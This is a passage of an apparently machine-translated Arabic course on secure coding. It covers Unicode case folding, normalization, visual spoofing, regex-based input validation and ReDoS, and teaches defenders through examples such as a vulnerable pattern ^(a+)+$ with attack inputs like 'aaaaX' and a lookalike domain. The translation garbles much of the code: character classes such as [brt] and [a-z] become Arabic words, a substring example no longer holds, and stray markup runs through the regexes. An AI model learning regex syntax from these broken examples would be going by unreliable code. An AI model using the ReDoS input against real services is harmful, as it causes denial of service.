وخير مثال على ذلك هي اللغات التركية التي تستخدم الأبجدية التركية. في هذه الأبجدية ، توجد أحرف "I" المنقطة والخالية من النقاط بأحرف مميزة بأشكال كبيرة وصغيرة. على سبيل المثال ، الأحرف الصغيرة المنقطة "i" عندما تصبح الأحرف الكبيرة منقطة بحرف كبير "İ" (وليس الأحرف الكبيرة بدون نقاط "I" كما هو الحال في لغة إنجليزية) ، والأحرف الكبيرة الخالية من النقاط "I" عندما تصبح الأحرف الصغيرة "ı" بدون نقاط صغيرة. لاحظ أن "i" و "I" ** غير  متساويين في تطابق غير حساس لحالة الأحرف في نظام تم تنفيذه بشكل صحيح لمثل هذه اللغات. وقد أدى ذلك إلى العديد من الثغرات الأمنية ، وسنذكر ذلك أحيانا في الدورة التدريبية لأنه مثال رائع على أنواع الأخطاء التي يمكن أن تحدث إذا لم تكن على علم بها.

إذا كنت تريد معرفة ما إذا كان "تسلسلان من الأحرف متكافئان" يتجاهلان الحالة ، فأنت بحاجة في الحالة العامة إلى استدعاء روتين للقيام بذلك ** وتزويده بالإعدادات المحلية لاستخدامها. هذا يثير القضايا المتعلقة بالتكافؤ بشكل عام ، والتي سنناقشها بعد ذلك.

#### معادلة يونيكود

يفترض العديد من المبرمجين أنه إذا كانت سلسلة من "نقاط الكود" النصية مختلفة ، فهي سلاسل مختلفة. في حين أن هذا جيد لبعض الأغراض ، إلا أن هذا هو النموذج العقلي الخاطئ للآخرين ، حتى لو افترضت أنك تريد مباراة "حساسة لحالة الأحرف". وكان لا بد من تطوير يونيكود بطريقة تتوافق مع المعايير الموجودة من قبل، مما أدى إلى بعض التعقيدات.

في بعض الحالات ، يجب عليك استخدام إجراءات المكتبة لاختبار التكافؤ الأساسي ل Unicode. وذلك لأن هناك بعض نقاط التعليمات البرمجية ، أو تسلسلات نقاط التعليمات البرمجية ، والتي يجب اعتبارها في كثير من الظروف *متكافئة* بمعنى أنها يجب أن تظهر دائما متطابقة ، حتى لو كانت لها قيم أساسية مختلفة. على سبيل المثال، نقطة الكود U+006E (الأحرف اللاتينية الصغيرة "n") متبوعة ب U+0303 (التلدة المدمجة "◌̃") تعادل بشكل أساسي نقطة الكود U+00F1 ("ñ").  مثال آخر هو الحرف "Å" الذي يمكن تمثيله ك U + 00C5 (الحرف "الحرف اللاتيني الكبير A مع الحلقة أعلاه") أو ك U + 212B ("علامة أنجستروم"): يجب اعتبار هاتين القيمتين متكافئتين.

في بعض الحالات الأخرى ، يجب عليك استخدام الإجراءات لاختبار توافق Unicode. وذلك لأن هناك بعض التسلسلات التي قد تبدو مختلفة ولكن سيكون لها نفس المعنى الأساسي. على سبيل المثال ، نقطة الرمز U + FB00 (الطباعة "ff") متوافقة ، ولكنها غير مكافئة ، مع U + 0066 U + 0066 (حرفان لاتينيان "f"). السلاسل المكافئة متوافقة دائما ، لكن السلاسل المتوافقة ليست متكافئة دائما.

هذا ألم ، لذلك يحدد معيار Unicode إجراءات تطبيع النص ، والتي تسمى تطبيع Unicode. يحول تسوية Unicode التسلسلات المكافئة أو المتوافقة إلى نفس تسلسل الأحرف بالضبط. هناك 4 أشكال تطبيع:

* NFD (التحلل الكنسي لنموذج التطبيع)تتحلل<br> الأحرف بالتكافؤ المتعارف عليه ، ويتم ترتيب أحرف الجمع المتعددة بترتيب معين.

* NFC (التكوين الأساسي لنموذج التطبيع)<br>تتحلل الأحرف ثم يعاد تكوينها بواسطة التكافؤ الأساسي.

* NFKD (تحلل توافق نموذج التطبيع)<br>تتحلل الأحرف حسب التوافق ، ويتم ترتيب أحرف الجمع المتعددة بترتيب معين.

* NFKC (تكوين توافق نموذج التسوية)<br>تتحلل الأحرف حسب التوافق ، ثم يعاد تكوينها بواسطة التكافؤ الأساسي.

من وجهة نظر الأمان ، لا يهم عادة *تطبيع* Unicode الذي تستخدمه ، ولكن إذا كنت تريد تحديد ما إذا كانت سلسلتان متساويتان ، فيجب أن تكون *متسقا* بشأن التطبيع الذي تستخدمه عند مقارنتهما. لاحظ أيضا أنه بمجرد تطبيع سلسلة من الأحرف ، لا يمكنك بشكل عام تجديد التسلسل الأصلي بالضبط.

#### الانتحال البصري

*يحدث الانتحال المرئي* عندما يخطئ المستخدم في سلسلتين مختلفتين ** . سيستخدم المهاجمون أحيانا الانتحال المرئي كجزء من الهجوم.

يمكن أن يحدث الانتحال المرئي حتى في مجموعة ASCII الفرعية من Unicode. يشبه الرقم "0" الحرف الكبير "O" ، والرقم "1" يشبه الحرف الصغير "l". على سبيل المثال، قد يحاول أحد المهاجمين إنشاء  مجال **paypa1.com** ضار  بدلا من **paypal.com**. أحيانا يتم قراءة التسلسل "rn" بشكل خاطئ على أنه الحرف "m"! ومع ذلك ، فإن معظم مستخدمي الحروف الهجائية اللاتينية على دراية بهذه المشكلات ، وتحرص العديد من الخطوط على جعلها أكثر تميزا.

ولكن بمجرد أن نتجاوز المجموعة الفرعية ASCII ، توجد العديد من الحيل الأخرى:

* يمكن التعبير عن التحلل<br> "ƶ" ك U + 007A U + 0335 (z + الجمع بين تراكب السكتة الدماغية القصيرة) أو ك U + 01B6. هذا يعني أن تسلسلات مختلفة من البايتات قد لا تزال تشير إلى نفس الحرف (وبالتالي تبدو متطابقة). التطبيع يحل هذه المشكلة.

* <br>عادة ما تبدو الحروف اليونانية المختلطة omicron واللاتينية "o" متشابهة ، على الرغم من وجودهما في أقسام مختلفة من Unicode.

* نفس النص<br>بعض الشخصيات تبدو متشابهة ببساطة. على سبيل المثال ، "-" واصلة ناقص U + 002D مقابل واصلة "‐" U + 2010.

* انتحال النص ثنائي الاتجاه<br>تكون بعض اللغات في الغالب من اليمين إلى اليسار ، ولكنها تتحول في مواقف معينة إلى اليسار إلى اليمين. وبالتالي ، يتضمن Unicode آليات للإشارة إلى الاتجاه. ولكن هذا يعني أن السلسلة "olleh" ، المحاطة ب "استخدام اليمين إلى اليسار" ، ستبدو بصريا مثل "hello".

يمكن أن يكون الانتحال البصري صعبا للغاية لمواجهته بشكل عام. لا يكفي دائما التطبيع واستخدام الخطوط المميزة ، ولكنه قد يكون مفيدا جدا في بعض الأحيان.

#### اختبار 1.3: Sidequest: النص وUnicode والإعدادات المحلية

\>\>في Unicode يتم تمثيل الحرف بقيمة 16 بت. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هناك ببساطة عدد كبير جدا من الأحرف لتشفيرها جميعا في 16 بت ، لذلك يستخدم Unicode الآن 21 بت لتشفير الأحرف. تستخدم العديد من اللغات وواجهات برمجة التطبيقات قيم "أحرف" 16 بت ، ولكن إذا كانت تمثل جميع أحرف Unicode ، فأحيانا تكون هذه الأحرف *جزءا* فقط من حرف فعلي.

[تفسير]

### التحقق من صحة النص

الآن بعد أن أصبح لدينا فهم حول النص ، دعنا نتحدث عن التحقق من صحته. في جميع الحالات تقريبا ، هناك فحصان على الأقل يجب القيام بهما على نص من مصدر غير موثوق به:

* تحقق من أن النص موجود في ترميز النص المتوقع. كما ذكرنا سابقا ، ما لم يكن لديك سبب للقيام بخلاف ذلك ، نوصي باستخدام ترميز UTF-8. سيتيح لك UTF-8 العمل مع البرامج النصية من اللغات التعسفية ، وهو متوافق مع الإصدارات السابقة مع ASCII ، وهو مدعوم على نطاق واسع. UTF-8 هو ترميز جيد ، ولكن ليس كل تسلسل من البايتات صالحا UTF-8. حدثت العديد من الثغرات الأمنية بسبب قبول نظام وحدات بايت من مهاجم غير صالح UTF-8. لذلك من المهم حقا التحقق من صحة نص UTF-8 قبل قبوله من مصدر غير موثوق به.

* تحقق مما إذا كان ضمن الحد الأدنى والحد الأقصى للأطوال ، إذا كان هناك الحد الأدنى والحد الأقصى للأطوال. سترغب العديد من الأنظمة في الحصول على حد أقصى لمجرد منع المهاجمين من إرسال كميات كبيرة من البيانات بشكل سخيف.

في بعض الحالات ، قد يكون من الصعب جدا التحقق من المزيد. الأسماء الشخصية ، على وجه الخصوص ، تمثل تحديا ، خاصة إذا كان يجب عليك التعامل مع الأسماء في جميع المناطق. تحتوي العديد من اللغات على اصطلاحات تختلف عن اللغات الأخرى. على سبيل المثال ، هل الاسم المعطى أو اللقب (على سبيل المثال ، اسم العائلة) مدرج أولا؟ قد لا يكون هناك حتى لقب أو اسم معين. قد تحتوي الأسماء على مسافات (حتى داخل اسم أو لقب معين) ، وبالطبع ، ليس هناك ما يضمن أن الاسم يستخدم الأحرف اللاتينية أو الصينية فقط. لمناقشة التحديات ، راجع [*الأكاذيب التي يؤمن بها المبرمجون حول الأسماء - مع أمثلة*](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/) مقالة بقلم توني روجرز (2018).

في كثير من الحالات ، على الرغم من ذلك ، هناك المزيد الذي يجب عليك القيام به للتحقق من صحة النص. في كثير من الحالات ، تحتوي القيم النصية على قواعد إضافية تحتاج إلى الالتزام بها ، وتختلف هذه القواعد اعتمادا على كل إدخال نصي.

في بعض الأحيان يجب أن تكون القيمة النصية واحدة من قائمة قصيرة من القيم. هذا سهل ، ما عليك سوى تخزين المجموعة المسموح بها في مكان ما (على سبيل المثال ، في مجموعة أو قاموس). بعد ذلك ، في كل مرة تتلقى فيها إدخالا ، تحقق من أن الإدخال هو أحد القيم المسموح بها.

لكن هذا يتركنا مع العديد من مدخلات النص التي لها قواعد ، لكنها ليست مجرد قائمة بالقيم المسموح بها. قد تكون تواريخ وأوقات وأرقام أجزاء وأرقام هواتف ومواقع ومجموعة من أنواع البيانات الأخرى. ما زلنا بحاجة إلى التحقق من صحة هذه المدخلات ، والعديد من البرامج لديها العديد من أنواع البيانات المختلفة. هذا يعني أننا بحاجة إلى طريقة ما لوصف ** قواعد التحقق من الصحة بسهولة. الأداة الشائعة لهذا الغرض هي التعبيرات العادية. في الوحدة التالية ، سنشرح اختياريا التعبيرات العادية (regexes) إذا لم تكن على دراية بها ؛ ستشرح الوحدة بعد ذلك كيفية استخدام التعبيرات العادية للتحقق من صحة المدخلات.

### مقدمة في التعبيرات العادية

[[اختياري]]

إذا كنت تعرف بالفعل عن التعبيرات العادية ، فلا تتردد في تخطي هذه الوحدة.

التعبير العادي ( *regex*) هو سلسلة من الأحرف التي تحدد نمط النص. من الناحية العملية ، تحتوي جميع لغات البرمجة على نظام مدمج أو مكتبة يسهل الحصول عليها تنفذ لغة تعبير عادية ، لذلك عادة ما يكون من السهل البدء في استخدام التعبيرات العادية في البرنامج بغض النظر عن كيفية تنفيذه.

ومع ذلك ، لم يستخدم بعض مطوري البرامج regexes مطلقا. توفر هذه الوحدة مقدمة موجزة إذا لم تكن على دراية بها بالفعل. إذا كنت تفهم بالفعل regexes ، فلا تتردد في التخطي إلى الوحدة التالية!

تاريخيا ، تم تطوير regexes لتسهيل البحث عن النص ، على الرغم من أنها تستخدم الآن غالبا لتحديد ما إذا كان بعض النص يتطابق مع نمط. هناك العديد من تطبيقات أنظمة regex ، ولكن نظرا لأنها تأتي جميعها من نفس الجذر التاريخي ، فإن لديها الكثير من القواسم المشتركة.

القاعدة الأكثر تافهة هي أن الحرف أو الرقم يطابق نفسه. أي أن regex**** "d" يطابق الحرف "**d**". تستخدم معظم التطبيقات التطابقات الحساسة لحالة الأحرف افتراضيا ، وهذا عادة ما تريده.

قاعدة أخرى هي أن الأقواس المربعة تحيط بقاعدة تحدد أيا من عدد الأحرف. إذا كانت الأقواس المربعة تحيط بالحروف الأبجدية الرقمية فقط ، فإن النمط يطابق أيا منها. لذلك **[بي آر تي]** يطابق "**b" أو "**r" أو "**t**" **واحد**.

النمط "**.** " يطابق أي حرف واحد ، مع استثناء محتمل لحرف السطر الجديد. إذا كنت تريد مطابقة فترة حرفية ، فاسبقها بشرطة مائلة عكسية ("**\.** "). عمليا كل تطبيق من regexes لديه آلية تتيح لك تحديد ما إذا كان ".** **" يجب أن تتطابق مع سطر جديد.

عادة ما يكون نمط regex عبارة عن سلسلة من القواعد ، يتم ذكرها واحدة تلو الأخرى. على سبيل المثال ، سيتطابق نمط regex** "ca[بي آر تي]**" مع النص "cab" أو "**car" أو "**cat**" ، لأن الأحرف** "c" و "**a**" تتطابق مع نفسها ، و** "" تتطابق مع** "b" أو "**r**" أو "**[بي آر تي]**t**********" واحدة**.

في الواقع ، بشكل افتراضي ، تبحث regexes ** عن النمط المحدد في سلسلة. أي أن تطبيق regex عادة ما يرى ما إذا كان النمط يتطابق مع بعض النص إذا كان يبدأ من الحرف الأول ، ثم الحرف الثاني ، وما إلى ذلك ، والإبلاغ عما إذا كان بإمكانه العثور على *أي* تطابق. لذا فإن النمط "**ca[بي آر تي]**" سيتطابق أيضا مع "**التنازل عن العرش**" لأن هناك "قطة****" في كلمة "**تنازل**".

ومع ذلك ، يمكن للتعبيرات العادية أن تفعل أكثر من ذلك بكثير. إذا اتبعت نمطا ب "**&#42;** "، وهذا يعني "*0 مرات أو أكثر*". لذا فإن نمط regex** "a&#42;b&#42;**x" يصف نمطا  من 0 أو أكثر من **a**'s ، متبوعا ب 0 أو أكثر **b** ، متبوعا ب **x**. يطابق هذا النمط سلاسل مثل "**aabx" و "**bbbx**" و "**abx" **، ولكن ليس "**aabb****". تدعم معظم تطبيقات regex أيضا "**+**" ل "*1 مرات أو أكثر*" و "**؟** " ل "*0 أو 1 مرات*". تتيح لك معظم تطبيقات regex أيضا استخدام الأقواس لتجميع التعبيرات ، على سبيل المثال ، "f (abc**)&#42;d" **تطابقات إذا كان هناك "**f**" ، متبوعا ب 0 أو أكثر من مثيلات التسلسل "abc" ، متبوعا**** بالحرف "**d**".

يمكنك عادة إجراء مطابقة غير حساسة لحالة الأحرف من خلال بعض الخيارات. تأكد من تعيين الإعدادات المحلية إذا كنت تستخدم مطابقة غير حساسة لحالة الأحرف، نظرا لأن اللغات المختلفة لها قواعد مختلفة، وفي بعض الأحيان قد تكون القواعد معقدة. على سبيل المثال ، في اللغة الألمانية ، الحرف الصغير "sharp-s**" "ß**" يعادل الأحرف الكبيرة "**SS**" عند استخدام تطابق غير حساس لحالة الأحرف. في بعض الحالات ، قد ترغب فقط في إجراء "*مطابقة غير حساسة لحالة الأحرف ASCII*" ؛ يقارن هذا تسلسلا من نقاط التعليمات البرمجية كما لو تم تعيين جميع نقاط التعليمات البرمجية ASCII في النطاق 0x41 إلى 0x5A (من الألف إلى الياء) إلى نقاط التعليمات البرمجية المقابلة في النطاق 0x61 إلى 0x7A (من الألف إلى الياء).

هناك ما هو أكثر بكثير من regexes. في الواقع ، هناك كتاب كامل عن  التعبيرات العادية فقط ، [*إتقان التعبيرات العادية ، 3rd Edition ، *](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/)بقلم جيفري فريدل (2006) ، وهناك العديد من البرامج التعليمية حول regexes مثل [البرنامج التعليمي للتعبيرات العادية للقوم العادي](https://refrf.shreyasminocha.me/) بواسطة Shreyas Minocha. لكن هذه المقدمة ستجعلنا نبدأ ، لأننا سنناقش الآن كيف يمكن استخدام regexes للتحقق من صحة الإدخال.

### استخدام التعبيرات العادية للتحقق من صحة إدخال النص

تحتاج العديد من البرامج إلى التحقق بسرعة من صحة نص الإدخال من مصادر غير موثوق بها. في حين أن هناك العديد من الطرق للقيام بذلك ، غالبا ما تكون regexes أداة مفيدة بشكل خاص للتحقق من صحة إدخال النص. عادة ما تكون Regexes سريعة في الكتابة (لذا فهي تستغرق وقتا قصيرا جدا في التطوير) وسهلة الاستخدام ومتاحة على نطاق واسع. كما أنها مرنة بما يكفي للعديد من مهام التحقق من صحة الإدخال ، ومضغوطة ، وعادة ما يتم تنفيذها بسرعة كبيرة. كما أنها معروفة ومفهومة على نطاق واسع. هذه مزايا مهمة. إذا كانت كتابة التحقق من صحة الإدخال صعبة للغاية ، فلن يتم ذلك. إنها لا تحل جميع مشكلات التحقق من صحة الإدخال المحتملة ، ولكنها مفيدة بما يكفي بحيث يكون من المهم معرفتها.

تم استخدام التعبيرات العادية في الأصل في برنامج للبحث *عن* أنماط النص ، وليس للتحقق من صحة مدخلات النص مقابل نمط. تعد Regexes جيدة أيضا في التحقق من صحة إدخال النص ، ولكن هناك بعض الأشياء التي تحتاج إلى معرفتها حتى تتمكن من استخدام regexes بشكل صحيح للتحقق من صحة إدخال النص.

#### تطابق، لا تبحث

تتمثل إحدى المشكلات الرئيسية في regexes في أن معظم تطبيقات regex تبحث افتراضيا ** لمعرفة ما إذا كان يمكن العثور على نمط معين في أي مكان داخل بعض النصوص. عندما نقوم بالتحقق من صحة المدخلات ، لا نريد البحث ؛ نريد أن نعرف ما إذا كان كل إدخال النص *يتطابق تماما مع* النمط. هذا يعني أننا بحاجة إلى أن نكون قادرين على سؤال تطبيق regex  "*هل يتطابق نص الإدخال هذا تماما مع هذا النمط"* - ورفض الإدخال إذا لم يتطابق. كما هو الحال مع أي تحقق آخر من صحة المدخلات ، نحتاج إلى جعل نمطنا مقيدا قدر الإمكان ، وإذا لم يتطابق الإدخال ، فقم برفض الإدخال.

الطريقة المعتادة لطلب regex لمطابقة الإدخال بأكمله هي تضمين *نقاط الارتساء* في regex. ما عليك سوى بدء نمط regex الخاص بك باستخدام *مرساة بدء* -  يتم تمثيلها عادة ب "**^**" أو أحيانا "\A**" - وإنهاء النمط ب** "$" **أو أحيانا "****\z**". مع هذه ، يجب أن يتطابق الإدخال بالكامل مع النمط. على سبيل المثال ، سيتطابق هذا التعبير العادي * مع أي* نص يحتوي على "**cab" أو "**car" أو "**cat**" - حتى أنه سيتطابق مع** "تنازل**" - لذلك **يجب ألا** تستخدم regex مثل هذا للتحقق من صحة الإدخال:**

**كاليفورنيا[بي آر تي]**

في المقابل ، لن يتطابق هذا التعبير العادي *إلا* مع الكلمات "**cab" أو "**car" أو "**cat**" تماما في معظم تطبيقات regex ، لأن** "^**" تعني "تطابق البداية"  و "**$**" *تعني *** **"تطابق النهاية"*:*

**^ca[بي آر تي]$**

في بعض التطبيقات (اعتمادا على الخيار) ، **قد تعني ** "^*" "بداية أي سطر" * وليس * "بداية السلسلة"  - وعادة ما تريد *"بداية السلسلة".** يمكن أن يحدث شيء مماثل مع "**$**". من الآن فصاعدا سنفترض أن "**^**" و "**$**" تعني بداية ونهاية السلسلة بأكملها.

#### تعرف على تطبيق Regex الخاص بك

تحتوي كل لغة برمجة تقريبا على تطبيق regex جيد واحد على الأقل. تشترك جميعها في العديد من الميزات ، لكن الكثير منها مختلف قليلا. لذلك ، عند استخدام تطبيق regex لم تستخدمه من قبل ، انظر إلى وثائقه في كل مرة تستخدم فيها عملية لم تستخدمها من قبل. فيما يلي بعض الاختلافات التي يجب البحث عنها.

هناك ثلاث عائلات رئيسية من تدوينات لغة regex:

1. التعبير العادي الأساسي (BRE)<br>هذا هو الإعداد الافتراضي ل **grep** و **sed**. يتم تعريف ذلك بواسطة معيار POSIX. ومع ذلك ، يكون بناء الجملة في بعض الأحيان محرجا بعض الشيء ، لذلك في معظم الحالات ، يكون من الأسهل استخدام التعبيرات العادية الموسعة بدلا من التحقق من صحة الإدخال.

2. التعبير العادي الموسع (ERE)<br>يتم تعريف هذا بواسطة معيار POSIX ويضيف إمكانات مثل استخدام الأقواس للتجميع و "**+**" ل "*واحد أو أكثر".* غالبا ما يستخدم هذا في برامج C. على سبيل المثال ، تعني**[ب - د] "+**" * *"واحد أو أكثر من الأحرف B أو C أو D".

3. التعبيرات العادية المتوافقة مع بيرل (PCRE)<br>هذا في الغالب امتداد لتنسيق ERE ؛ تستخدم العديد من لغات البرمجة الأخرى هذه العائلة من لغات regex. يتضمن إمكانات مثل "**\d**" لتمثيل الأرقام.

 فيما يلي بعض الأشياء المهمة التي تختلف:

* في بعض الأحيان يكون هناك خيار أو طريقة بديلة لمطابقة الإدخال بالكامل ؛ إذا كان ذلك متاحا ، يمكنك استخدام ذلك بدلا من رموز التثبيت. تأكد من أنه يطابق كل شيء ، رغم ذلك ؛ بعض الطرق تحقق فقط من البداية.

* في بعض الأحيان** يتطابق "^**" مع بداية البيانات بأكملها ، بينما في حالات أخرى يمثل بداية أي سطر في البيانات. الشيء نفسه ينطبق على "**$**". غالبا ما يتم التحكم في ذلك بواسطة * خيار متعدد الخطوط*.

* ال "**.** " لتمثيل  "*أي حرف"* لا يتطابق دائما مع حرف السطر الجديد (**\n**) ؛ غالبا ما يكون هناك خيار لتشغيل هذا أو إيقاف تشغيله.

* هل يدعم بشكل صحيح Unicode والترميز الذي تستخدمه؟

* هل يمكنه التعامل مع البيانات بحرف **NUL** (قيمة البايت 0) داخل البيانات؟ إذا لم يكن الأمر كذلك ، ويمكن أن تحتوي بيانات الإدخال الخاصة بك على ** حرف NUL مضمن  ، فستحتاج إلى التحقق من صحة البيانات أولا للتأكد من عدم وجود ** أحرف NUL** قبل تمرير البيانات إلى تطبيق regex.**

* هل المطابقة حساسة لحالة الأحرف؟ عادة ما تكون حساسة لحالة الأحرف بشكل افتراضي ، وهناك طريقة تافهة لجعلها غير حساسة لحالة الأحرف. إذا كانت غير حساسة لحالة الأحرف، فتذكر أن الأحرف التي تحتوي على تطابقات غير حساسة لحالة الأحرف بالضبط تعتمد على الإعدادات المحلية. على سبيل المثال، يتطابق** "I**" و"**i" باللغة الإنجليزية ("**en**") ولغة** C ("C**")، ولكن ليس باللغة التركية ("**tr****"). في اللغة التركية ، يتطابق الحرف الكبير اللاتيني Unicode I مع الحرف اللاتيني الصغير DOTLESS I - وليس الحرف الصغير "**i**".

في بعض اللغات ، كما هو الحال في Ruby ، عادة ما تستخدم ** \A** و \z بدلا من "^" و "$" **لمطابقة بداية / نهاية السلسلة ، لأن سطر المطابقة** "**^**"  و  "**$******" يبدأ / ينتهي بدلا من ذلك.** **

#### أولوية الفرع

تدعم جميع تطبيقات regex *تقريبا الفروع* - أي أن "aa|bb|cc**" يطابق **AA أو ** **bb** أو **cc****. تدعم جميع تطبيقات ERE و PCRE الفروع ، وحتى بعض تطبيقات BRE تدعم الفروع إذا تمت كتابتها ك "**&#92;**|" بدلا من "**|** ". *أولوية* تشغيل الفرع قياسية ، لكنها ليست ما يتوقعه بعض المستخدمين. regex "**^aa|bb$**" تعني  "إما أن تبدأ ب aa أو تنتهي ب bb" *، وليس *"بالضبط aa أو bb".**  عند استخدام regexes للتحقق من صحة الإدخال ، فإن سلسلة الفروع غير المحاطة بأقواس تكون دائما خطأ عمليا. ما تريده عادة هو "**^ (aa|bb) $**" وهو ما يعني "*بالضبط aa أو bb".*

** لذلك ، عندما يكون لديك فرع ("|") في regex ، قم بتجميع التعبير بأكمله مع الفروع باستخدام الأقواس.**

#### مدققو إدخال الاختبار

مرة أخرى ، يجب أن تعرف ما يجب ألا يقبله برنامجك ، وأن تستخدم بعض هذه الأمثلة كحالات اختبار تلقائية للتأكد من أن برنامجك سيرفضها بشكل صحيح. هذا مهم بشكل خاص مع regexes ، لأنه من السهل كتابة regex يبدو جيدا ولكنه يسمح بالمدخلات التي لم يكن المقصود منها. يمكن أن يساعدك هذا في التقاط ، على سبيل المثال ، نقاط الارتساء المفقودة أو الفشل في إحاطة الفروع بأقواس.

#### اختبار 1.4: استخدام التعبيرات العادية للتحقق من صحة إدخال النص

\>\>أي مما يلي يطابق فقط "1 أو أكثر من الأحرف اللاتينية الصغيرة" باستخدام تعبير منتظم ممتد (بالنظر إلى لغة POSIX)؟<<

(!)  **[من الألف إلى الياء]&#42;**

( ) **[من الألف إلى الياء]+**

( ) **^[من الألف إلى الياء]&#42;$**

(x) **^[من الألف إلى الياء]+$**

[تفسير]

تذكر  أن **^...$** مطلوبة لجعل هذه القائمة مسموح بها (*يجب أن* يتطابق النص مع النمط) ، و "**+**" تعني "*واحد أو أكثر".*

[تفسير]

### مواجهة هجمات ReDoS على التعبيرات العادية

عند إضافة رمز ، هناك خطر من وجود ثغرة أمنية في التعليمة البرمجية المضافة. هذا صحيح بشكل خاص عند إضافة تعليمات برمجية من المفترض أن تساعد في الحفاظ على أمان برنامجك ، لأنه بحكم التعريف ، قد تؤدي المشكلات في هذا الرمز إلى مشكلة أمنية.

إذا أضفت عمليات التحقق من صحة الإدخال باستخدام التعبيرات العادية - وهو نهج شائع ومفيد - فهناك نوع من الثغرة الأمنية التي يمكنك إضافتها عن غير قصد تسمى  ثغرة عدم وجود ثغرة أمنية *في رفض الخدمة (ReDoS) للتعبير العادي*. إذا كان برنامجك يحتوي على ثغرة أمنية في ReDoS ، فيمكن للمهاجمين فرض المواقف التي يمكن فيها تشغيل التعبير العادي لفترة طويلة للغاية (ربما أيام أو سنوات). والنتيجة هي رفض الخدمة (DoS) - قد يكون الهجوم قادرا على إرسال كمية صغيرة من البيانات والتسبب في عدم توفر الخدمة! هذا ليس نظريا. في عام  2020 ، ** تم العثور على حزمة npm لامتدادات websocket وإصدار Ruby الخاص بها هذا الخلل (تم إعطاؤهما معرفات ** CVE-2020-7662 [ و ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7662)CVE-2020-7663[ على التوالي).](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7663)

السبب في أن ثغرة ReDoS ممكنة هو أن معظم تطبيقات regex لديها أسوأ تعقيد في الحالات ينمو بشكل كبير بناء على حجم المدخلات. خلفية صغيرة قد تساعد هنا. هناك طريقتان رئيسيتان لتنفيذ regexes:  إنسان آلي محدود * حتمي (DFA) أو *إنسان آلي محدود غير حتمي** (NFA). DFAs سريعة ، ويرجع ذلك جزئيا إلى أنها لا تتراجع أبدا ، و DFAs محصنة ضد نقاط ضعف ReDoS. لكن DFAs محدودة أيضا فيما يمكنهم القيام به. من الناحية العملية ، فإن معظم تطبيقات regex اليوم هي NFAs ، ومن  المحتمل أن *تكون* NFAs  عرضة لهجمات ReDoS.

تتراجع تطبيقات NFA ل regexes - وهذا هو معظمها - ** كلما فشلوا في مباراة معينة حتى يجدوا تطابقا أو جربوا جميع الاحتمالات. باختصار ، في أسوأ الحالات يحاولون *كل* المجموعات. بالنسبة للعديد من أنماط التعبير العادية ، فإن هذه الحالة الأسوأ ليست مشكلة. ومع ذلك ، فإن أنواعا معينة من أنماط regex يمكن أن تجعل هذه الحالة الأسوأ سيئة حقا. على وجه الخصوص ، دعنا نتخيل أننا نقدم نمطا حيث:

1. يستخدم نمط regex التكرار على التعبيرات الفرعية المعقدة (استخدام "**+**" و "**&#42; **" على التعبيرات الفرعية المعقدة)، و

2. ضمن هذه التعبيرات الفرعية المتكررة ، هناك رموز وتعبيرات تكرار إضافية تتطابق مع لاحقة تطابق آخر. ([OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS))

مثال تافه هو نمط regex "**^ (a +) + $**". دعنا نتخيل أن أحد المهاجمين قدم قيمة الإدخال "**aaaaX**". سيطابق NFA الحرف الأول من الإدخال**** "a" مع الحرف "a" في النمط بسهولة ، ولكن بعد ذلك يكون لتطبيق regex خياران: هل يجب أن يحاول تطبيق  "+" *الداخلي أو *الخارجي** "**+* *** "** على الحرف التالي؟ ستجرب معظم التطبيقات التطبيق الداخلي أولا ، ثم تتراجع حسب الحاجة. في أسوأ الحالات ، يتعين على NFA تجربة *جميع* المجموعات الممكنة. وبالتالي ، لتحديد ما إذا كان الإدخال "**aaaaX**" يتطابق مع النمط ، يتعين على NFA regex تجربة 16 مسارا محتملا (جميع الاحتمالات) ، مع فشل كل مسار في النهاية بسبب "X" اللاحق.**** إذا قدم المهاجم الإدخال "**aaaaaaaaaaaaaaaaX**" ، فسيكون هناك 65536 مسارا محتملا ، مع مضاعفة عدد المسارات لكل "**a**" إضافية. إذا قدم أحد المهاجمين 80 '**a** متبوعا ب **X** ، فسيحاول هذا الموضوع معالجة جميع المجموعات ، الأمر الذي سيستغرق وقتا طويلا بحيث يصبح رفضا للخدمة.

نستخدم مصطلح *regexes الضعيفة* لأنماط regex مع هذا السلوك الأسوأ الفظيع. مصطلح صناعي شائع لهذه الأنماط هو *regexes الشريرة*. لا يعني ذلك أن regex يتم توفيره من قبل مهاجم بالضرورة ، بل إن سلوكه الأسوأ هو "الشر" وهذا يجعلهم عرضة للهجوم. مصطلح آخر لهذا السلوك هو *التراجع الكارثي*.

هناك العديد من الحلول لهذه المشكلة ، بما في ذلك ما يلي:

1. استخدم تطبيق regex الذي يستخدم DFA. التطبيقات المستندة إلى DFA ليست عرضة لهذه المشكلة. على سبيل المثال ، في النظام البيئي NPM ، يقوم "**re2**" بتنفيذ محرك DFA regex. ومع ذلك ، فإن محركات regex المستندة إلى DFA تكون أقل قدرة بشكل عام وفي العديد من البيئات تكون أكثر صعوبة في التثبيت والاستخدام ، لذلك نادرا ما يتم ذلك.

2. قم بتعديل regex بحيث لا يحتوي على هذا السلوك الأسوأ. هذا هو النهج المعتاد. كن حذرا بشكل خاص من أي مجموعة "**(...)** " الذي يحتوي على فرع و / أو ينتهي بتكرار ويتكرر هو نفسه.

    1. إذا كان هناك تكرار أو فرع في regex يتكرر هو نفسه ، فأعد كتابة regex بحيث يحدد الحرف التالي في الإدخال بشكل لا لبس فيه ما إذا كان التكرار سيستمر أم لا. على سبيل المثال ، أعد كتابة "^ (a +) + $" **ك "**^ a + $**".**

    2. نهج آخر هو استخدام الآليات التي تخبر محرك regex بعدم التراجع ؛ تحتوي العديد من تطبيقات regex على *محددات كمية ملكية* و / أو *تجميع ذري* يمكن أن يمنع التراجع غير الضروري.

    3. تجنب التكرار غير المحدود. على سبيل المثال ، حدد الحد الأقصى لعدد التكرار (على سبيل المثال ، **{0,5}**) بحيث يكون سلوك الحالة الأسوأ محدودا إلى حد كبير.

    تقوم بعض الأدوات بفحص التعليمات البرمجية المصدر لاكتشاف regexes ذات السلوكيات الأسوأ (قد تكون هذه أدوات مستقلة أو جزءا من أدوات أكبر).

